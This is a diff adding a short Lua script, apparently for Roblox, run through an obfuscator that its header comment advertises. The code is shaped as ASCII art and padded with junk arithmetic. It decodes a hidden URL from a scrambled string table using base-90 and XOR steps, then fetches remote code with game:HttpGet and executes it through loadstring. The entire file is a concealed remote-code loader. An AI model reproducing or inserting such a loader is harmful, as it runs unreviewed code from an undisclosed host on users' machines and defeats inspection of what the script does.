@@ -1,0 +1,52 @@
+-- Obfuscated with SakrYn at dsc.gg/sakryn | ON TOP
+
+
+
+                                          local r
+                                        = {[6] =
+                                     "EPZK", [3
+                                  ] = "-i|E1",
+                                 [2] = "n.Y",
+                               [4] = ")?i", [
+                             11] = "&G/$[" ,
+                             [13] = "vmD-i",
+                             [1] = "Taw;" ,
+                             [12] = "D]r3",
+                        [5   ] = "Q|f", [15
+                        ]    = "~oJ", [10 ]
+                       =     "+yyd", [8]  =
+                              "./pM", [9] =
+                              "S>pLA", [7 ]
+                     =         "`c&N", [17]
+                     = "gH",   [14] = "-Cdx"
+                     , [16] =   "b?,"  }   ;
+                     local p =   "!$%&("  ..
+                     ")*+,-" ..   "./012"  ..
+                     "34567".."8"  .."9:;<" ..
+                     "=>?@A".."BC"  .."DEF".."GHI"
+                     .."JK".."LMNOP"  .."QRSTU" ..            "VWXYZ"  ..
+                     "[]^_`".. "abcde"  .. "fghij"        .."klmno".."pqrs"
+                      .."t" .."uvwxy" .. "z{|}~" ;     local  k  =  table  .
+                      concat(r); local h = {}; local e = 34563; for c = 1, #k
+                        , 5 do local w = 0;  for y = c, c +  4 do w = w * 90  +
+                           string.find(p, k: sub(y, y), 1 , true) - 1; end ;
+                                for y = 3, 0, - 1 do e = (e * 72 + 20676) % 65521
+                         ; h[#h + 1] = string.char(bit32.bxor(math.floor(w/256^y)
+                           % 256,  e % 256 )) ; end;  end; r  = table .
+                            concat(h) :sub( 1,  51);  local z , d  =
+                             loadstring(game:HttpGet(r)); assert(z,
+                               d); do local f = {6, 5}; f[1] = f[2]
+                                 % 8;  end; do local f = 3; f = (f *
+                                     8) % 4; end; local f = 7 + 9  %
+                                     8 % 4 % 6 + 2 - 1 + 5 + 3 % 9 % 5
+                                          + 2 % 6 - 7 - 6 + 9 + 3 - 5 +
+                                                7 - 3 % 9 - 8 - 3 % 5  %
+                                                        1 - 3 + 5 - 1 - 8
+                                                             % 6 - 3 % 2  -
+                                                                1 - 9 % 6 +
+                                                                   4 + 5 - 6
+                                                                     +    9;
+                                                                       return
+                                                                           z(
+                                                                           ...
+                                                                             )
